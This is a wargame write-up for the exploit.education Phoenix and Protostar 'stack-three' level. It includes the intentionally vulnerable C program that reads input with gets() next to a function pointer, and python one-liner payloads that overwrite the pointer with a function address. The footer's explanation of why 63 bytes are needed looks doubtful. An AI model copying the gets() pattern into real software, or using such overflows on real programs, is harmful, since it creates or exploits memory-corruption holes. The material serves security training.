# Phoenix and Protostar -- Stack 3


## Level Information
Stack Three looks at overwriting function pointers stored on the stack.

**Hints** <ul>
<li>    You can use gdb and objdump to determine where the complete_level() function is in memory.</li>
</ul>

```C
/*
 * phoenix/stack-three, by https://exploit.education
 *
 * The aim is to change the contents of the changeme variable to 0x0d0a090a
 *
 * When does a joke become a dad joke?
 *   When it becomes apparent.
 *   When it's fully groan up.
 *
 */

#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

char *gets(char *);

void complete_level() {
  printf("Congratulations, you've finished " LEVELNAME " :-) Well done!\n");
  exit(0);
}

int main(int argc, char **argv) {
  struct {
    char buffer[64];
    volatile int (*fp)();
  } locals;

  printf("%s\n", BANNER);

  locals.fp = NULL;
  gets(locals.buffer);

  if (locals.fp) {
    printf("calling function pointer @ %p\n", locals.fp);
    fflush(stdout);
    locals.fp();
  } else {
    printf("function pointer remains unmodified :~( better luck next time!\n");
  }

  exit(0);
}
```


## Solution
This involved a little bit poking aroung with GDB. Opening the file in the debugger and issuing the comman `info functions` would give us the location of `complete_level` ( or `win` in case for Protostar). So crafting the overflow and appending the address of the function in _little endian_ will lead to successfully branch code to function.

The command for crafting are <ul>
<li> For Protostar: python -c "print 'A' * 64 + '\x24\x84\x04\x08'" | ./stack3 </li>
<li> For Phoenix: python3 -c "print('A' * 63 + '\x9d\x06\x40\x00\x00\x00\x00\x00')" | /opt/phoenix/amd64/stack-three </li>
</ul>

<footer> In Phoenix level, it seems that `gets()` writes a '\n' to the input string. So instead of creating a string of length 64, we need a length of 63 </footer>
